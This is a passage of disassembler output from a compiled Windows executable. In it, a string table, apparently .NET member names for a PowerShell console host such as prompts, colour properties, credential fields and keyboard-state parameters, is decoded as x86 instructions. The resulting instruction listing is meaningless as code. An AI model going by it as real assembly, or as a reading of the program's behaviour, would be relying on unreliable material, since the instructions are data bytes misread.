  4076a4:	72 6f                	jb     0x407715
  4076a6:	6d                   	insl   (%dx),%es:(%edi)
  4076a7:	70 74                	jo     0x40771d
  4076a9:	00 45 78             	add    %al,0x78(%ebp)
  4076ac:	69 74 4e 65 73 74 65 	imul   $0x64657473,0x65(%esi,%ecx,2),%esi
  4076b3:	64 
  4076b4:	50                   	push   %eax
  4076b5:	72 6f                	jb     0x407726
  4076b7:	6d                   	insl   (%dx),%es:(%edi)
  4076b8:	70 74                	jo     0x40772e
  4076ba:	00 4e 6f             	add    %cl,0x6f(%esi)
  4076bd:	74 69                	je     0x407728
  4076bf:	66 79 42             	data16 jns 0x407704
  4076c2:	65 67 69 6e 41 70 70 	imul   $0x696c7070,%gs:0x41(%bp),%ebp
  4076c9:	6c 69 
  4076cb:	63 61 74             	arpl   %esp,0x74(%ecx)
  4076ce:	69 6f 6e 00 4e 6f 74 	imul   $0x746f4e00,0x6e(%edi),%ebp
  4076d5:	69 66 79 45 6e 64 41 	imul   $0x41646e45,0x79(%esi),%esp
  4076dc:	70 70                	jo     0x40774e
  4076de:	6c                   	insb   (%dx),%es:(%edi)
  4076df:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4076e6:	00 53 65             	add    %dl,0x65(%ebx)
  4076e9:	74 53                	je     0x40773e
  4076eb:	68 6f 75 6c 64       	push   $0x646c756f
  4076f0:	45                   	inc    %ebp
  4076f1:	78 69                	js     0x40775c
  4076f3:	74 00                	je     0x4076f5
  4076f5:	50                   	push   %eax
  4076f6:	72 69                	jb     0x407761
  4076f8:	76 61                	jbe    0x40775b
  4076fa:	74 65                	je     0x407761
  4076fc:	44                   	inc    %esp
  4076fd:	61                   	popa
  4076fe:	74 61                	je     0x407761
  407700:	00 43 75             	add    %al,0x75(%ebx)
  407703:	72 72                	jb     0x407777
  407705:	65 6e                	outsb  %gs:(%esi),(%dx)
  407707:	74 43                	je     0x40774c
  407709:	75 6c                	jne    0x407777
  40770b:	74 75                	je     0x407782
  40770d:	72 65                	jb     0x407774
  40770f:	00 43 75             	add    %al,0x75(%ebx)
  407712:	72 72                	jb     0x407786
  407714:	65 6e                	outsb  %gs:(%esi),(%dx)
  407716:	74 55                	je     0x40776d
  407718:	49                   	dec    %ecx
  407719:	43                   	inc    %ebx
  40771a:	75 6c                	jne    0x407788
  40771c:	74 75                	je     0x407793
  40771e:	72 65                	jb     0x407785
  407720:	00 49 6e             	add    %cl,0x6e(%ecx)
  407723:	73 74                	jae    0x407799
  407725:	61                   	popa
  407726:	6e                   	outsb  %ds:(%esi),(%dx)
  407727:	63 65 49             	arpl   %esp,0x49(%ebp)
  40772a:	64 00 4e 61          	add    %cl,%fs:0x61(%esi)
  40772e:	6d                   	insl   (%dx),%es:(%edi)
  40772f:	65 00 55 49          	add    %dl,%gs:0x49(%ebp)
  407733:	00 5f 75             	add    %bl,0x75(%edi)
  407736:	69 00 67 65 74 5f    	imul   $0x5f746567,(%eax),%eax
  40773c:	45                   	inc    %ebp
  40773d:	72 72                	jb     0x4077b1
  40773f:	6f                   	outsl  %ds:(%esi),(%dx)
  407740:	72 46                	jb     0x407788
  407742:	6f                   	outsl  %ds:(%esi),(%dx)
  407743:	72 65                	jb     0x4077aa
  407745:	67 72 6f             	addr16 jb 0x4077b7
  407748:	75 6e                	jne    0x4077b8
  40774a:	64 43                	fs inc %ebx
  40774c:	6f                   	outsl  %ds:(%esi),(%dx)
  40774d:	6c                   	insb   (%dx),%es:(%edi)
  40774e:	6f                   	outsl  %ds:(%esi),(%dx)
  40774f:	72 00                	jb     0x407751
  407751:	73 65                	jae    0x4077b8
  407753:	74 5f                	je     0x4077b4
  407755:	45                   	inc    %ebp
  407756:	72 72                	jb     0x4077ca
  407758:	6f                   	outsl  %ds:(%esi),(%dx)
  407759:	72 46                	jb     0x4077a1
  40775b:	6f                   	outsl  %ds:(%esi),(%dx)
  40775c:	72 65                	jb     0x4077c3
  40775e:	67 72 6f             	addr16 jb 0x4077d0
  407761:	75 6e                	jne    0x4077d1
  407763:	64 43                	fs inc %ebx
  407765:	6f                   	outsl  %ds:(%esi),(%dx)
  407766:	6c                   	insb   (%dx),%es:(%edi)
  407767:	6f                   	outsl  %ds:(%esi),(%dx)
  407768:	72 00                	jb     0x40776a
  40776a:	67 65 74 5f          	addr16 gs je 0x4077cd
  40776e:	45                   	inc    %ebp
  40776f:	72 72                	jb     0x4077e3
  407771:	6f                   	outsl  %ds:(%esi),(%dx)
  407772:	72 42                	jb     0x4077b6
  407774:	61                   	popa
  407775:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407778:	72 6f                	jb     0x4077e9
  40777a:	75 6e                	jne    0x4077ea
  40777c:	64 43                	fs inc %ebx
  40777e:	6f                   	outsl  %ds:(%esi),(%dx)
  40777f:	6c                   	insb   (%dx),%es:(%edi)
  407780:	6f                   	outsl  %ds:(%esi),(%dx)
  407781:	72 00                	jb     0x407783
  407783:	73 65                	jae    0x4077ea
  407785:	74 5f                	je     0x4077e6
  407787:	45                   	inc    %ebp
  407788:	72 72                	jb     0x4077fc
  40778a:	6f                   	outsl  %ds:(%esi),(%dx)
  40778b:	72 42                	jb     0x4077cf
  40778d:	61                   	popa
  40778e:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407791:	72 6f                	jb     0x407802
  407793:	75 6e                	jne    0x407803
  407795:	64 43                	fs inc %ebx
  407797:	6f                   	outsl  %ds:(%esi),(%dx)
  407798:	6c                   	insb   (%dx),%es:(%edi)
  407799:	6f                   	outsl  %ds:(%esi),(%dx)
  40779a:	72 00                	jb     0x40779c
  40779c:	67 65 74 5f          	addr16 gs je 0x4077ff
  4077a0:	57                   	push   %edi
  4077a1:	61                   	popa
  4077a2:	72 6e                	jb     0x407812
  4077a4:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  4077ab:	67 72 6f             	addr16 jb 0x40781d
  4077ae:	75 6e                	jne    0x40781e
  4077b0:	64 43                	fs inc %ebx
  4077b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b3:	6c                   	insb   (%dx),%es:(%edi)
  4077b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b5:	72 00                	jb     0x4077b7
  4077b7:	73 65                	jae    0x40781e
  4077b9:	74 5f                	je     0x40781a
  4077bb:	57                   	push   %edi
  4077bc:	61                   	popa
  4077bd:	72 6e                	jb     0x40782d
  4077bf:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  4077c6:	67 72 6f             	addr16 jb 0x407838
  4077c9:	75 6e                	jne    0x407839
  4077cb:	64 43                	fs inc %ebx
  4077cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4077ce:	6c                   	insb   (%dx),%es:(%edi)
  4077cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4077d0:	72 00                	jb     0x4077d2
  4077d2:	67 65 74 5f          	addr16 gs je 0x407835
  4077d6:	57                   	push   %edi
  4077d7:	61                   	popa
  4077d8:	72 6e                	jb     0x407848
  4077da:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  4077e1:	67 72 6f             	addr16 jb 0x407853
  4077e4:	75 6e                	jne    0x407854
  4077e6:	64 43                	fs inc %ebx
  4077e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4077e9:	6c                   	insb   (%dx),%es:(%edi)
  4077ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4077eb:	72 00                	jb     0x4077ed
  4077ed:	73 65                	jae    0x407854
  4077ef:	74 5f                	je     0x407850
  4077f1:	57                   	push   %edi
  4077f2:	61                   	popa
  4077f3:	72 6e                	jb     0x407863
  4077f5:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  4077fc:	67 72 6f             	addr16 jb 0x40786e
  4077ff:	75 6e                	jne    0x40786f
  407801:	64 43                	fs inc %ebx
  407803:	6f                   	outsl  %ds:(%esi),(%dx)
  407804:	6c                   	insb   (%dx),%es:(%edi)
  407805:	6f                   	outsl  %ds:(%esi),(%dx)
  407806:	72 00                	jb     0x407808
  407808:	67 65 74 5f          	addr16 gs je 0x40786b
  40780c:	44                   	inc    %esp
  40780d:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407811:	46                   	inc    %esi
  407812:	6f                   	outsl  %ds:(%esi),(%dx)
  407813:	72 65                	jb     0x40787a
  407815:	67 72 6f             	addr16 jb 0x407887
  407818:	75 6e                	jne    0x407888
  40781a:	64 43                	fs inc %ebx
  40781c:	6f                   	outsl  %ds:(%esi),(%dx)
  40781d:	6c                   	insb   (%dx),%es:(%edi)
  40781e:	6f                   	outsl  %ds:(%esi),(%dx)
  40781f:	72 00                	jb     0x407821
  407821:	73 65                	jae    0x407888
  407823:	74 5f                	je     0x407884
  407825:	44                   	inc    %esp
  407826:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40782a:	46                   	inc    %esi
  40782b:	6f                   	outsl  %ds:(%esi),(%dx)
  40782c:	72 65                	jb     0x407893
  40782e:	67 72 6f             	addr16 jb 0x4078a0
  407831:	75 6e                	jne    0x4078a1
  407833:	64 43                	fs inc %ebx
  407835:	6f                   	outsl  %ds:(%esi),(%dx)
  407836:	6c                   	insb   (%dx),%es:(%edi)
  407837:	6f                   	outsl  %ds:(%esi),(%dx)
  407838:	72 00                	jb     0x40783a
  40783a:	67 65 74 5f          	addr16 gs je 0x40789d
  40783e:	44                   	inc    %esp
  40783f:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407843:	42                   	inc    %edx
  407844:	61                   	popa
  407845:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407848:	72 6f                	jb     0x4078b9
  40784a:	75 6e                	jne    0x4078ba
  40784c:	64 43                	fs inc %ebx
  40784e:	6f                   	outsl  %ds:(%esi),(%dx)
  40784f:	6c                   	insb   (%dx),%es:(%edi)
  407850:	6f                   	outsl  %ds:(%esi),(%dx)
  407851:	72 00                	jb     0x407853
  407853:	73 65                	jae    0x4078ba
  407855:	74 5f                	je     0x4078b6
  407857:	44                   	inc    %esp
  407858:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40785c:	42                   	inc    %edx
  40785d:	61                   	popa
  40785e:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407861:	72 6f                	jb     0x4078d2
  407863:	75 6e                	jne    0x4078d3
  407865:	64 43                	fs inc %ebx
  407867:	6f                   	outsl  %ds:(%esi),(%dx)
  407868:	6c                   	insb   (%dx),%es:(%edi)
  407869:	6f                   	outsl  %ds:(%esi),(%dx)
  40786a:	72 00                	jb     0x40786c
  40786c:	67 65 74 5f          	addr16 gs je 0x4078cf
  407870:	56                   	push   %esi
  407871:	65 72 62             	gs jb  0x4078d6
  407874:	6f                   	outsl  %ds:(%esi),(%dx)
  407875:	73 65                	jae    0x4078dc
  407877:	46                   	inc    %esi
  407878:	6f                   	outsl  %ds:(%esi),(%dx)
  407879:	72 65                	jb     0x4078e0
  40787b:	67 72 6f             	addr16 jb 0x4078ed
  40787e:	75 6e                	jne    0x4078ee
  407880:	64 43                	fs inc %ebx
  407882:	6f                   	outsl  %ds:(%esi),(%dx)
  407883:	6c                   	insb   (%dx),%es:(%edi)
  407884:	6f                   	outsl  %ds:(%esi),(%dx)
  407885:	72 00                	jb     0x407887
  407887:	73 65                	jae    0x4078ee
  407889:	74 5f                	je     0x4078ea
  40788b:	56                   	push   %esi
  40788c:	65 72 62             	gs jb  0x4078f1
  40788f:	6f                   	outsl  %ds:(%esi),(%dx)
  407890:	73 65                	jae    0x4078f7
  407892:	46                   	inc    %esi
  407893:	6f                   	outsl  %ds:(%esi),(%dx)
  407894:	72 65                	jb     0x4078fb
  407896:	67 72 6f             	addr16 jb 0x407908
  407899:	75 6e                	jne    0x407909
  40789b:	64 43                	fs inc %ebx
  40789d:	6f                   	outsl  %ds:(%esi),(%dx)
  40789e:	6c                   	insb   (%dx),%es:(%edi)
  40789f:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a0:	72 00                	jb     0x4078a2
  4078a2:	67 65 74 5f          	addr16 gs je 0x407905
  4078a6:	56                   	push   %esi
  4078a7:	65 72 62             	gs jb  0x40790c
  4078aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ab:	73 65                	jae    0x407912
  4078ad:	42                   	inc    %edx
  4078ae:	61                   	popa
  4078af:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4078b2:	72 6f                	jb     0x407923
  4078b4:	75 6e                	jne    0x407924
  4078b6:	64 43                	fs inc %ebx
  4078b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b9:	6c                   	insb   (%dx),%es:(%edi)
  4078ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4078bb:	72 00                	jb     0x4078bd
  4078bd:	73 65                	jae    0x407924
  4078bf:	74 5f                	je     0x407920
  4078c1:	56                   	push   %esi
  4078c2:	65 72 62             	gs jb  0x407927
  4078c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4078c6:	73 65                	jae    0x40792d
  4078c8:	42                   	inc    %edx
  4078c9:	61                   	popa
  4078ca:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4078cd:	72 6f                	jb     0x40793e
  4078cf:	75 6e                	jne    0x40793f
  4078d1:	64 43                	fs inc %ebx
  4078d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d4:	6c                   	insb   (%dx),%es:(%edi)
  4078d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d6:	72 00                	jb     0x4078d8
  4078d8:	67 65 74 5f          	addr16 gs je 0x40793b
  4078dc:	50                   	push   %eax
  4078dd:	72 6f                	jb     0x40794e
  4078df:	67 72 65             	addr16 jb 0x407947
  4078e2:	73 73                	jae    0x407957
  4078e4:	46                   	inc    %esi
  4078e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4078e6:	72 65                	jb     0x40794d
  4078e8:	67 72 6f             	addr16 jb 0x40795a
  4078eb:	75 6e                	jne    0x40795b
  4078ed:	64 43                	fs inc %ebx
  4078ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f0:	6c                   	insb   (%dx),%es:(%edi)
  4078f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f2:	72 00                	jb     0x4078f4
  4078f4:	73 65                	jae    0x40795b
  4078f6:	74 5f                	je     0x407957
  4078f8:	50                   	push   %eax
  4078f9:	72 6f                	jb     0x40796a
  4078fb:	67 72 65             	addr16 jb 0x407963
  4078fe:	73 73                	jae    0x407973
  407900:	46                   	inc    %esi
  407901:	6f                   	outsl  %ds:(%esi),(%dx)
  407902:	72 65                	jb     0x407969
  407904:	67 72 6f             	addr16 jb 0x407976
  407907:	75 6e                	jne    0x407977
  407909:	64 43                	fs inc %ebx
  40790b:	6f                   	outsl  %ds:(%esi),(%dx)
  40790c:	6c                   	insb   (%dx),%es:(%edi)
  40790d:	6f                   	outsl  %ds:(%esi),(%dx)
  40790e:	72 00                	jb     0x407910
  407910:	67 65 74 5f          	addr16 gs je 0x407973
  407914:	50                   	push   %eax
  407915:	72 6f                	jb     0x407986
  407917:	67 72 65             	addr16 jb 0x40797f
  40791a:	73 73                	jae    0x40798f
  40791c:	42                   	inc    %edx
  40791d:	61                   	popa
  40791e:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407921:	72 6f                	jb     0x407992
  407923:	75 6e                	jne    0x407993
  407925:	64 43                	fs inc %ebx
  407927:	6f                   	outsl  %ds:(%esi),(%dx)
  407928:	6c                   	insb   (%dx),%es:(%edi)
  407929:	6f                   	outsl  %ds:(%esi),(%dx)
  40792a:	72 00                	jb     0x40792c
  40792c:	73 65                	jae    0x407993
  40792e:	74 5f                	je     0x40798f
  407930:	50                   	push   %eax
  407931:	72 6f                	jb     0x4079a2
  407933:	67 72 65             	addr16 jb 0x40799b
  407936:	73 73                	jae    0x4079ab
  407938:	42                   	inc    %edx
  407939:	61                   	popa
  40793a:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40793d:	72 6f                	jb     0x4079ae
  40793f:	75 6e                	jne    0x4079af
  407941:	64 43                	fs inc %ebx
  407943:	6f                   	outsl  %ds:(%esi),(%dx)
  407944:	6c                   	insb   (%dx),%es:(%edi)
  407945:	6f                   	outsl  %ds:(%esi),(%dx)
  407946:	72 00                	jb     0x407948
  407948:	67 65 74 5f          	addr16 gs je 0x4079ab
  40794c:	53                   	push   %ebx
  40794d:	68 6f 75 6c 64       	push   $0x646c756f
  407952:	45                   	inc    %ebp
  407953:	78 69                	js     0x4079be
  407955:	74 00                	je     0x407957
  407957:	73 65                	jae    0x4079be
  407959:	74 5f                	je     0x4079ba
  40795b:	53                   	push   %ebx
  40795c:	68 6f 75 6c 64       	push   $0x646c756f
  407961:	45                   	inc    %ebp
  407962:	78 69                	js     0x4079cd
  407964:	74 00                	je     0x407966
  407966:	67 65 74 5f          	addr16 gs je 0x4079c9
  40796a:	45                   	inc    %ebp
  40796b:	78 69                	js     0x4079d6
  40796d:	74 43                	je     0x4079b2
  40796f:	6f                   	outsl  %ds:(%esi),(%dx)
  407970:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  407975:	74 5f                	je     0x4079d6
  407977:	45                   	inc    %ebp
  407978:	78 69                	js     0x4079e3
  40797a:	74 43                	je     0x4079bf
  40797c:	6f                   	outsl  %ds:(%esi),(%dx)
  40797d:	64 65 00 53 68       	fs add %dl,%gs:0x68(%ebx)
  407982:	6f                   	outsl  %ds:(%esi),(%dx)
  407983:	75 6c                	jne    0x4079f1
  407985:	64 45                	fs inc %ebp
  407987:	78 69                	js     0x4079f2
  407989:	74 00                	je     0x40798b
  40798b:	45                   	inc    %ebp
  40798c:	78 69                	js     0x4079f7
  40798e:	74 43                	je     0x4079d3
  407990:	6f                   	outsl  %ds:(%esi),(%dx)
  407991:	64 65 00 73 68       	fs add %dh,%gs:0x68(%ebx)
  407996:	6f                   	outsl  %ds:(%esi),(%dx)
  407997:	75 6c                	jne    0x407a05
  407999:	64 45                	fs inc %ebp
  40799b:	78 69                	js     0x407a06
  40799d:	74 00                	je     0x40799f
  40799f:	65 78 69             	gs js  0x407a0b
  4079a2:	74 43                	je     0x4079e7
  4079a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4079a5:	64 65 00 4d 61       	fs add %cl,%gs:0x61(%ebp)
  4079aa:	69 6e 00 55 6e 68 61 	imul   $0x61686e55,0x0(%esi),%ebp
  4079b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4079b2:	64 6c                	fs insb (%dx),%es:(%edi)
  4079b4:	65 64 45             	gs fs inc %ebp
  4079b7:	78 63                	js     0x407a1c
  4079b9:	65 70 74             	gs jo  0x407a30
  4079bc:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  4079c3:	74 41                	je     0x407a06
  4079c5:	72 67                	jb     0x407a2e
  4079c7:	73 00                	jae    0x4079c9
  4079c9:	43                   	inc    %ebx
  4079ca:	75 72                	jne    0x407a3e
  4079cc:	72 65                	jb     0x407a33
  4079ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4079cf:	74 44                	je     0x407a15
  4079d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4079d2:	6d                   	insl   (%dx),%es:(%edi)
  4079d3:	61                   	popa
  4079d4:	69 6e 5f 55 6e 68 61 	imul   $0x61686e55,0x5f(%esi),%ebp
  4079db:	6e                   	outsb  %ds:(%esi),(%dx)
  4079dc:	64 6c                	fs insb (%dx),%es:(%edi)
  4079de:	65 64 45             	gs fs inc %ebp
  4079e1:	78 63                	js     0x407a46
  4079e3:	65 70 74             	gs jo  0x407a5a
  4079e6:	69 6f 6e 00 63 72 65 	imul   $0x65726300,0x6e(%edi),%ebp
  4079ed:	64 69 6e 66 6f 00 74 	imul   $0x6174006f,%fs:0x66(%esi),%ebp
  4079f4:	61 
  4079f5:	72 67                	jb     0x407a5e
  4079f7:	65 74 4e             	gs je  0x407a48
  4079fa:	61                   	popa
  4079fb:	6d                   	insl   (%dx),%es:(%edi)
  4079fc:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  407a00:	73 65                	jae    0x407a67
  407a02:	72 76                	jb     0x407a7a
  407a04:	65 64 31 00          	gs xor %eax,%fs:(%eax)
  407a08:	69 45 72 72 6f 72 00 	imul   $0x726f72,0x72(%ebp),%eax
  407a0f:	75 73                	jne    0x407a84
  407a11:	65 72 4e             	gs jb  0x407a62
  407a14:	61                   	popa
  407a15:	6d                   	insl   (%dx),%es:(%edi)
  407a16:	65 00 6d 61          	add    %ch,%gs:0x61(%ebp)
  407a1a:	78 55                	js     0x407a71
  407a1c:	73 65                	jae    0x407a83
  407a1e:	72 4e                	jb     0x407a6e
  407a20:	61                   	popa
  407a21:	6d                   	insl   (%dx),%es:(%edi)
  407a22:	65 00 70 61          	add    %dh,%gs:0x61(%eax)
  407a26:	73 73                	jae    0x407a9b
  407a28:	77 6f                	ja     0x407a99
  407a2a:	72 64                	jb     0x407a90
  407a2c:	00 6d 61             	add    %ch,0x61(%ebp)
  407a2f:	78 50                	js     0x407a81
  407a31:	61                   	popa
  407a32:	73 73                	jae    0x407aa7
  407a34:	77 6f                	ja     0x407aa5
  407a36:	72 64                	jb     0x407a9c
  407a38:	00 70 66             	add    %dh,0x66(%eax)
  407a3b:	53                   	push   %ebx
  407a3c:	61                   	popa
  407a3d:	76 65                	jbe    0x407aa4
  407a3f:	00 53 79             	add    %dl,0x79(%ebx)
  407a42:	73 74                	jae    0x407ab8
  407a44:	65 6d                	gs insl (%dx),%es:(%edi)
  407a46:	2e 52                	cs push %edx
  407a48:	75 6e                	jne    0x407ab8
  407a4a:	74 69                	je     0x407ab5
  407a4c:	6d                   	insl   (%dx),%es:(%edi)
  407a4d:	65 2e 49             	gs cs dec %ecx
  407a50:	6e                   	outsb  %ds:(%esi),(%dx)
  407a51:	74 65                	je     0x407ab8
  407a53:	72 6f                	jb     0x407ac4
  407a55:	70 53                	jo     0x407aaa
  407a57:	65 72 76             	gs jb  0x407ad0
  407a5a:	69 63 65 73 00 4d 61 	imul   $0x614d0073,0x65(%ebx),%esp
  407a61:	72 73                	jb     0x407ad6
  407a63:	68 61 6c 41 73       	push   $0x73416c61
  407a68:	41                   	inc    %ecx
  407a69:	74 74                	je     0x407adf
  407a6b:	72 69                	jb     0x407ad6
  407a6d:	62 75 74             	bound  %esi,0x74(%ebp)
  407a70:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  407a74:	6d                   	insl   (%dx),%es:(%edi)
  407a75:	61                   	popa
  407a76:	6e                   	outsb  %ds:(%esi),(%dx)
  407a77:	61                   	popa
  407a78:	67 65 64 54          	addr16 gs fs push %esp
  407a7c:	79 70                	jns    0x407aee
  407a7e:	65 00 66 6c          	add    %ah,%gs:0x6c(%esi)
  407a82:	61                   	popa
  407a83:	67 73 00             	addr16 jae 0x407a86
  407a86:	63 61 70             	arpl   %esp,0x70(%ecx)
  407a89:	74 69                	je     0x407af4
  407a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  407a8c:	6e                   	outsb  %ds:(%esi),(%dx)
  407a8d:	00 6d 65             	add    %ch,0x65(%ebp)
  407a90:	73 73                	jae    0x407b05
  407a92:	61                   	popa
  407a93:	67 65 00 74 61       	add    %dh,%gs:0x61(%si)
  407a98:	72 67                	jb     0x407b01
  407a9a:	65 74 00             	gs je  0x407a9d
  407a9d:	75 73                	jne    0x407b12
  407a9f:	65 72 00             	gs jb  0x407aa2
  407aa2:	63 72 65             	arpl   %esi,0x65(%edx)
  407aa5:	64 54                	fs push %esp
  407aa7:	79 70                	jns    0x407b19
  407aa9:	65 73 00             	gs jae 0x407aac
  407aac:	6f                   	outsl  %ds:(%esi),(%dx)
  407aad:	70 74                	jo     0x407b23
  407aaf:	69 6f 6e 73 00 76 61 	imul   $0x61760073,0x6e(%edi),%ebp
  407ab6:	6c                   	insb   (%dx),%es:(%edi)
  407ab7:	75 65                	jne    0x407b1e
  407ab9:	00 72 65             	add    %dh,0x65(%edx)
  407abc:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  407ac0:	67 6c                	insb   (%dx),%es:(%di)
  407ac2:	65 00 73 6f          	add    %dh,%gs:0x6f(%ebx)
  407ac6:	75 72                	jne    0x407b3a
  407ac8:	63 65 00             	arpl   %esp,0x0(%ebp)
  407acb:	64 65 73 74          	fs gs jae 0x407b43
  407acf:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  407ad6:	00 63 6c             	add    %ah,0x6c(%ebx)
  407ad9:	69 70 00 66 69 6c 6c 	imul   $0x6c6c6966,0x0(%eax),%esi
  407ae0:	00 6f 72             	add    %ch,0x72(%edi)
  407ae3:	69 67 69 6e 00 63 6f 	imul   $0x6f63006e,0x69(%edi),%esp
  407aea:	6e                   	outsb  %ds:(%esi),(%dx)
  407aeb:	74 65                	je     0x407b52
  407aed:	6e                   	outsb  %ds:(%esi),(%dx)
  407aee:	74 73                	je     0x407b63
  407af0:	00 73 74             	add    %dh,0x74(%ebx)
  407af3:	72 49                	jb     0x407b3e
  407af5:	64 00 73 74          	add    %dh,%fs:0x74(%ebx)
  407af9:	72 54                	jb     0x407b4f
  407afb:	69 74 6c 65 00 73 74 	imul   $0x72747300,0x65(%esp,%ebp,2),%esi
  407b02:	72 
  407b03:	50                   	push   %eax
  407b04:	72 6f                	jb     0x407b75
  407b06:	6d                   	insl   (%dx),%es:(%edi)
  407b07:	70 74                	jo     0x407b7d
  407b09:	00 73 74             	add    %dh,0x74(%ebx)
  407b0c:	72 56                	jb     0x407b64
  407b0e:	61                   	popa
  407b0f:	6c                   	insb   (%dx),%es:(%edi)
  407b10:	00 62 6c             	add    %ah,0x6c(%edx)
  407b13:	53                   	push   %ebx
  407b14:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407b18:	65 00 61 72          	add    %ah,%gs:0x72(%ecx)
  407b1c:	72 43                	jb     0x407b61
  407b1e:	68 6f 69 63 65       	push   $0x6563696f
  407b23:	00 69 6e             	add    %ch,0x6e(%ecx)
  407b26:	74 44                	je     0x407b6c
  407b28:	65 66 61             	gs popaw
  407b2b:	75 6c                	jne    0x407b99
  407b2d:	74 00                	je     0x407b2f
  407b2f:	77 56                	ja     0x407b87
  407b31:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  407b38:	77 53                	ja     0x407b8d
  407b3a:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  407b3d:	43                   	inc    %ebx
  407b3e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b3f:	64 65 00 6c 70 4b    	fs add %ch,%gs:0x4b(%eax,%esi,2)
  407b45:	65 79 53             	gs jns 0x407b9b
  407b48:	74 61                	je     0x407bab
  407b4a:	74 65                	je     0x407bb1
  407b4c:	00 70 77             	add    %dh,0x77(%eax)
  407b4f:	73 7a                	jae    0x407bcb
  407b51:	42                   	inc    %edx
  407b52:	75 66                	jne    0x407bba
  407b54:	66 00 4f 75          	data16 add %cl,0x75(%edi)
  407b58:	74 41                	je     0x407b9b
  407b5a:	74 74                	je     0x407bd0
  407b5c:	72 69                	jb     0x407bc7
  407b5e:	62 75 74             	bound  %esi,0x74(%ebp)
  407b61:	65 00 63 63          	add    %ah,%gs:0x63(%ebx)
  407b65:	68 42 75 66 66       	push   $0x66667542
  407b6a:	00 77 46             	add    %dh,0x46(%edi)
  407b6d:	6c                   	insb   (%dx),%es:(%edi)
  407b6e:	61                   	popa
  407b6f:	67 73 00             	addr16 jae 0x407b72
  407b72:	6b 65 79 73          	imul   $0x73,0x79(%ebp),%esp
  407b76:	00 62 6c             	add    %ah,0x6c(%edx)
  407b79:	53                   	push   %ebx
  407b7a:	68 69 66 74 00       	push   $0x746669
  407b7f:	62 6c 41 6c          	bound  %ebp,0x6c(%ecx,%eax,2)
  407b83:	74 47                	je     0x407bcc
  407b85:	72 00                	jb     0x407b87
  407b87:	62 6c 49 6e          	bound  %ebp,0x6e(%ecx,%ecx,2)
  407b8b:	63 6c 75 64          	arpl   %ebp,0x64(%ebp,%esi,2)
  407b8f:	65 4b                	gs dec %ebx
  407b91:	65 79 44             	gs jns 0x407bd8
  407b94:	6f                   	outsl  %ds:(%esi),(%dx)
  407b95:	77 6e                	ja     0x407c05
  407b97:	00 73 65             	add    %dh,0x65(%ebx)
  407b9a:	6e                   	outsb  %ds:(%esi),(%dx)
  407b9b:	64 65 72 00          	fs gs jb 0x407b9f
  407b9f:	65 00 63 6f          	add    %ah,%gs:0x6f(%ebx)
  407ba3:	6c                   	insb   (%dx),%es:(%edi)
  407ba4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ba5:	72 00                	jb     0x407ba7
  407ba7:	70 64                	jo     0x407c0d
  407ba9:	00 70 6f             	add    %dh,0x6f(%eax)
  407bac:	73 69                	jae    0x407c17
  407bae:	74 69                	je     0x407c19
  407bb0:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb1:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb2:	00 42 61             	add    %al,0x61(%edx)
  407bb5:	72 43                	jb     0x407bfa
  407bb7:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb8:	6c                   	insb   (%dx),%es:(%edi)
  407bb9:	6f                   	outsl  %ds:(%esi),(%dx)
  407bba:	72 00                	jb     0x407bbc
  407bbc:	6f                   	outsl  %ds:(%esi),(%dx)
  407bbd:	62 6a 52             	bound  %ebp,0x52(%edx)
  407bc0:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  407bc4:	64 00 73 74          	add    %dh,%fs:0x74(%ebx)
  407bc8:	64 48                	fs dec %eax
  407bca:	61                   	popa
